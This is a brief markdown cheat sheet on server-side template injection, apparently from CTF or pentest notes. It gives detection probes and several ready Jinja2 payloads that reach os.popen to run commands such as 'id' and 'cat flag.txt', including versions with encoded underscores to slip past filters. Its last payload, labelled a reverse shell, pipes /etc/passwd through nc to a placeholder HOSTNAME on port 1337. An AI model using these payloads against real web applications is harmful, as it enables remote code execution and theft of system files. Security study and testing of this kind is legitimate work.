# Template Injection
https://portswigger.net/web-security/server-side-template-injection

## Detect
To detect template injection start with following
```
{{7*'7'}
{{7*'7'}}
```
https://portswigger.net/web-security/images/template-decision-tree.png

## Exploitation
### Jinja2
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

```python
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Reverse shell with Jinja2 injection
{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc HOSTNAME 1337')['read']() == 'chiv' %} a {% endif %}
```
